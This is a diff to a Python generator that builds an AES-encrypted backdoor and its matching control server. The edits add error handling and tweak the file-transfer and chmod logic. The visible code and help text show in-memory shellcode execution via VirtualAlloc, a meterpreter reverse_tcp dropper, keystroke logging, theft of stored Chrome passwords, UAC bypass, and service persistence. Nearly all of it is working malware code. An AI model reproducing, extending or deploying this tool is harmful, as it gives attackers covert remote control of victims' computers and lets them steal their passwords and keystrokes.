@@ -59,9 +59,9 @@ def MeterDrop(mhost, mport):
 		return HNzdFhkeybuffervICp
 	except: return None
 
-def ExecInMem(binary):
-	if binary != None:
-		iNGRgaQLVJ = bytearray(binary)
+def ExecInMem(shellcode):
+	if shellcode != None:
+		iNGRgaQLVJ = bytearray(shellcode)
 		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(imHlcWqpKVwgodv), ctypes.c_int(len(iNGRgaQLVJ)))
 		DWsMxliK = (ctypes.c_char * len(iNGRgaQLVJ)).from_buffer(iNGRgaQLVJ)
@@ -308,7 +308,7 @@ while 1:
 				encrypted = EncodeAES(cipher, sendit)
 				s.send(encrypted)
 			else:
-				encrypted =  EncodeAES(cipher, ' [X] Chrome, Chromium and Aviator are not installed.**nEOFEOFEOFEOFEOFX' % (passpath))
+				encrypted =  EncodeAES(cipher, ' [X] Chrome, Chromium and Aviator are not installed.**nEOFEOFEOFEOFEOFX')
 				s.send(encrypted)
 		else:
 			encrypted = EncodeAES(cipher, " [X] Error: chromepass command is only available on windows.**nEOFEOFEOFEOFEOFX")
@@ -411,19 +411,23 @@ while 1:
 		s.send(encrypted)
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):													## Data starting with this code indicates we are to receive a file
-		ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
-		f = open(ufilename, 'wb')
-		f.write(decrypted[32:])
-		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-			data = s.recv(2048)
-			decrypted = DecodeAES(cipher, data)
-			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-				f.write(decrypted[:-16])
-			else:
-				f.write(decrypted)
-		f.close()
-		encrypted = EncodeAES(cipher, " [*] File uploaded to %s**nEOFEOFEOFEOFEOFX" % (ufilename))
-		s.send(encrypted)
+		try:
+			ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
+			f = open(ufilename, 'wb')
+			f.write(decrypted[32:])
+			while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+				data = s.recv(2048)
+				decrypted = DecodeAES(cipher, data)
+				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+					f.write(decrypted[:-16])
+				else:
+					f.write(decrypted)
+			f.close()
+			encrypted = EncodeAES(cipher, " [*] File uploaded to %s**nEOFEOFEOFEOFEOFX" % (ufilename))
+			s.send(encrypted)
+		except Exception as e:
+			encrypted = EncodeAES(cipher, " [*] Something went wrong: %s**nEOFEOFEOFEOFEOFX" % (e))
+			s.send(encrypted)
 
 	elif decrypted.startswith('run '):
 		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
@@ -485,7 +489,11 @@ f.close()
 rawserv = '''#!/usr/bin/env python
 from Crypto.Cipher import AES
 from Crypto import Random
-import readline,socket,base64,os,sys,string,random
+import socket,base64,os,sys,string,random
+try:
+	import readline
+except:
+	pass
 
 def completer(text, state):
 	options = [i for i in commands if i.startswith(text)]
@@ -597,8 +605,11 @@ def fhelp():
 	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
 
 commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
-readline.parse_and_bind("tab: complete")
-readline.set_completer(completer)
+try:
+	readline.parse_and_bind("tab: complete")
+	readline.set_completer(completer)
+except:
+	pass
 BLOCK_SIZE, PADDING, cfrom = 32, '{', ' '
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
@@ -656,18 +667,22 @@ while True:
 		fnextcmd()
 
 	elif decrypted[16:32] == "EOFEOFEOFEOFEOFS":				## Download a file
-		print ' [*] AES-Encrypted file (%s) received!**n' % (downfile)
-		f = open(downfile, 'wb')
-		f.write(decrypted[32:])
-		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-			data = s.recv(2048)
-			decrypted = DecodeAES(cipher, data)
-			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-				f.write(decrypted[:-32])
-			else:
-				f.write(decrypted)
-		f.close()
-		fnextcmd()
+		try:
+			print ' [*] AES-Encrypted file (%s) received!**n' % (downfile)
+			f = open(downfile, 'wb')
+			f.write(decrypted[32:])
+			while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+				data = s.recv(2048)
+				decrypted = DecodeAES(cipher, data)
+				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+					f.write(decrypted[:-32])
+				else:
+					f.write(decrypted)
+			f.close()
+			fnextcmd()
+		except Exception as e:
+			print " [*] Something went wrong: %s**nEOFEOFEOFEOFEOFX" % (e)
+			fnextcmd()
 
 	elif decrypted[28:32] == 'WTF1':							## Print the output of bypassuac commands
 		print decrypted[32:]
@@ -688,5 +703,6 @@ se = open(serverName, 'wb')
 finalserver = rawserv.replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
 se.write(finalserver)
 se.close()
-os.system('chmod +x %s %s' % (backdoorName, serverName))
+if os.name == 'posix':
+	os.system('chmod +x %s %s' % (backdoorName, serverName))
 print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
